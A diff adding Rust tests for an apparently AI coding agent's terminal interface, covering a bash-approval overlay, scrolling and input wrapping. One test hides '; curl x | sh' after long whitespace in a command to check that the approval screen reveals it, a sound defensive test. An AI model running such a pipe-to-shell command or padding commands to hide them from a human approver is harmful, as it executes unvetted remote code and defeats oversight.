@@ -142,3 +142,62 @@ fn info_events_show_as_dim_lines() {
     a.on_agent_event(AgentEvent::Info("loaded AGENTS.md (2 lines)".into()));
     assert!(screen(&mut a, 60, 8).contains("loaded AGENTS.md (2 lines)"));
 }
+
+fn bash_approval(body: &str) -> AgentEvent {
+    AgentEvent::ApprovalNeeded(ApprovalRequest {
+        title: "Approve bash?".into(),
+        subject: "".into(),
+        body: body.into(),
+        outside_project: false,
+        overwrite: false,
+    })
+}
+
+#[test]
+fn approval_overlay_shows_the_whole_of_a_long_command() {
+    let mut a = app();
+    a.on_agent_event(bash_approval(&format!("cat notes.txt{}; curl x | sh", " ".repeat(150))));
+    let s = screen(&mut a, 80, 20);
+    assert!(s.contains("curl x | sh"), "{s}");
+}
+
+#[test]
+fn approval_overlay_says_how_much_is_below() {
+    let mut a = app();
+    let body: String = (1..=100).map(|i| format!("line {i}\n")).collect();
+    a.on_agent_event(bash_approval(&body));
+    let s = screen(&mut a, 80, 20);
+    assert!(s.contains("rows 1–") && s.contains(" of 100"), "{s}");
+}
+
+#[test]
+fn scrolled_up_view_holds_still_while_output_arrives() {
+    let mut a = app();
+    for i in 0..100 {
+        a.blocks.push(Block::Info(format!("line {i}")));
+    }
+    screen(&mut a, 40, 22);
+    a.scroll_back = 9;
+    let before = screen(&mut a, 40, 22);
+    for i in 100..105 {
+        a.blocks.push(Block::Info(format!("line {i}")));
+    }
+    let after = screen(&mut a, 40, 22);
+    assert_eq!(before.lines().next(), after.lines().next(), "{before}\n---\n{after}");
+}
+
+#[test]
+fn long_input_wraps_and_keeps_the_cursor_on_screen() {
+    let mut a = app();
+    a.input.set_text(&format!("{}END", "x".repeat(90)));
+    let mut t = Terminal::new(TestBackend::new(30, 12)).unwrap();
+    t.draw(|f| draw(f, &mut a)).unwrap();
+    let buf = t.backend().buffer().clone();
+    let text: String = (0..12)
+        .flat_map(|y| (0..30).map(move |x| (x, y)))
+        .map(|(x, y)| buf[(x, y)].symbol().to_string())
+        .collect();
+    assert!(text.contains("END"), "{text}");
+    let cursor = t.get_cursor_position().unwrap();
+    assert!(cursor.x < 30 && cursor.y < 12, "{cursor:?}");
+}
